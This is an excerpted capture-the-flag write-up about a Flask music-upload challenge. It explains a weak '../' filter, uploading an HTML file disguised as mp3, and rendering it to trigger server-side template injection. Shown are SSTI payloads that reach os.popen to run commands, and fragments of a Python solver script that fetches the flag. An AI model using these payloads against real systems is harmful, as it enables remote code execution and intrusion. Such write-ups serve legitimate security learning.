...
date: '2024-11-23'
tags: ['Path Transversal', 'LFI', 'WEB', 'Exploitation', 'RCE', 'SSTI']
draft: false
...
Now, let’s dive into the interesting part of the code. The `/upload` endpoint handles the upload of a `music_file` provided by the user. The uploaded file’s name is passed to the `safe_filename()` function to sanitize it.
...
The `safe_filename()` function recursively checks for `../` in the filename and removes it if found. This aims to prevent directory traversal, but let's see if it's actually effective.
...
But what would be content of our `malicious.mp3.html`?

I created simpler html file for ssti .
...
<body>
    ...
    <textarea type="text" id="page" name="page" value="{{7*7}}">
</body>
</html>
```

our ssti palyoad will be inside value attribule of text area . LEts first test it whether it is workign or not. 

THe file is uploaded but how do we access it. ecause we can only see output only if malicious.mp3.html is rendered. bow how? here helps comes thiss lien fo code

```render_template('home.html', page=f'{page}.html')```

we can render our malicious.mp3.html by using page parameter like this

``` http://your-instance-url/?page=malicious.mp3```

This will render our html adn our output will be shown in textarea field 49.


### Content of `malicious.mp3.html`
...
In this file, our SSTI payload is placed inside the `value` attribute of the `<textarea>` element. This will evaluate the expression `{{7*7}}` if SSTI is present, allowing us to confirm that the vulnerability works.
...
```html
{{config._class.init.globals_['os'].popen('id').read()}}
```

This payload will get Remote Code Execution (RCE) using SSTI.

To execute this, simply replace the value of the `value` attribute with the final payload and re-upload the file. Here is how the updated HTML file looks:
...
<body>
    <h1>Triggering SSTI</h1>
    <textarea type="text" id="page" name="page" value="{{config._class.init.globals_['os'].popen('ls -la /app').read()}}"></textarea>
</body>
</html>
```
...
This will render the updated HTML and execute the command, showing the output of `ls -la /app` in the `<textarea>` field, thus achieving RCE.
...
def upload_file():
    headers = {
        'Host': 'a99773be360f370c4a0d1.playat.flagyard.com',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryu1i8nw4tZ1Hi1EN7',
        'Connection': 'keep-alive',
    }

    # Corrected payload to include the intended HTML content with SSTI
...
def access_payload():
    ...
    if response.status_code == 200:
        ...
        # Use BeautifulSoup to parse the HTML and find the input value
        soup = BeautifulSoup(response.text, 'html.parser')
        input_tag = soup.find('input', {'id': 'page'})
        
        if input_tag and input_tag.has_attr('value'):
            output = input_tag['value'].strip()  # Extract the value attribute from the input tag

            # Use the new page value in the next request
            if output:
                print(f"[*] Flag: {output}")
            else:
